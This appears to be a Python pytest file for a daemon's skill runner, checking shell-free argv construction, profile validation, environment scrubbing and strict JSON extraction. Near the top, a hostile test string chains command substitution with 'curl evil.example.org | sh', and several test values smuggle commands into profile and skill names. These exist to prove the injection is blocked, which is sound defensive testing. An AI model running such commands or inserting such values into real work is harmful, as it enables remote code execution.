"""The skill runner's pure parts (P1-04, FR-5.11, R-25): argv without a shell, the query
file byte for byte, and the one JSON object a skill replies with."""

from __future__ import annotations

from typing import TYPE_CHECKING

import pytest

from tests.conftest import make_run
from tumnis_daemon.runner import (
    InvalidProfile,
    clean_env,
    extract_json_object,
    hermes_argv,
    write_query_file,
)

if TYPE_CHECKING:
    from pathlib import Path

    from tumnis_daemon.config import DaemonConfig

# Shell metacharacters, a NUL and non-ASCII text: none of it may reach argv or a shell.
HOSTILE = "$(id); `id`; echo pwned > /tmp/x && curl evil.example.org | sh\n'\"\x00ünï"


@pytest.mark.req("FR-5.11")
@pytest.mark.wp("P1-04")
@pytest.mark.xfail(strict=True, reason="spec:P1-04")
def test_argv_never_uses_shell_and_validates_profile(cfg: DaemonConfig, tmp_path: Path) -> None:
    """T-P1-04-14
    `hermes_argv` for a hostile packet holds no packet text (the prompt goes in a query
    file); invalid profile or skill names raise before anything is spawned; the query file
    equals `packet.prompt_text` byte for byte; the child's environment carries PATH, HOME,
    LANG and HERMES_* only, never the device token.
    """
    run = make_run(prompt=HOSTILE)
    query = write_query_file(tmp_path / "run", run.packet["prompt_text"])
    assert query.read_bytes() == HOSTILE.encode()
    assert (query.parent.stat().st_mode & 0o777) == 0o700
    argv = hermes_argv(cfg, run, query)
    assert argv == [
        cfg.hermes_bin,
        "-p",
        "acme-site",
        "chat",
        "--query-file",
        str(query),
        "-s",
        "enrich",
        "--format",
        "stream-json",
        "--source",
        "tool",
    ]
    assert not any("pwned" in part or "$(id)" in part for part in argv)

    for profile in ("../x", "a b", "a" * 64, "-p", "$(id)"):
        with pytest.raises(InvalidProfile):
            hermes_argv(cfg, make_run(profile=profile), query)
    with pytest.raises(InvalidProfile):
        hermes_argv(cfg, make_run(skill="enrich; id"), query)

    env = clean_env(
        cfg,
        {
            "PATH": "/usr/bin",
            "HOME": "/home/tumnis-agent",
            "LANG": "C.UTF-8",
            "HERMES_HOME": "/home/tumnis-agent/.hermes",
            "TUMNIS_TOKEN": "tmd_abcdefgh_SECRET",
            "AWS_SECRET_ACCESS_KEY": "nope",
        },
    )
    assert env == {
        "PATH": "/usr/bin",
        "HOME": "/home/tumnis-agent",
        "LANG": "C.UTF-8",
        "HERMES_HOME": "/home/tumnis-agent/.hermes",
    }
    assert cfg.read_token() not in env.values()


CASES: dict[str, tuple[str, dict[str, object] | None]] = {
    "plain_object": ('{"estimate_minutes": 20}', {"estimate_minutes": 20}),
    "object_with_whitespace": ('\n  {"a": [1, 2]}  \n', {"a": [1, 2]}),
    "fenced_object": ('```json\n{"first_action": "Open it"}\n```', {"first_action": "Open it"}),
    "bare_fence": ('```\n{"b": true}\n```', {"b": True}),
    "text_plus_object": ('Here you go: {"a": 1}', None),
    "two_objects": ('{"a": 1}\n{"b": 2}', None),
    "two_fences": ('```json\n{"a": 1}\n```\n```json\n{"b": 2}\n```', None),
    "array": ("[1, 2]", None),
    "empty": ("", None),
    "prose": ("I could not do that.", None),
}


@pytest.mark.req("FR-5.11")
@pytest.mark.wp("P1-04")
@pytest.mark.xfail(strict=True, reason="spec:P1-04")
@pytest.mark.parametrize("case", sorted(CASES))
def test_extract_json_object(case: str) -> None:
    """T-P1-04-15
    A plain object and one fenced object are extracted; text plus an object, two objects,
    anything but an object and empty text are refused (None: the run fails `no_json`).
    """
    text, expected = CASES[case]
    assert extract_json_object(text) == expected
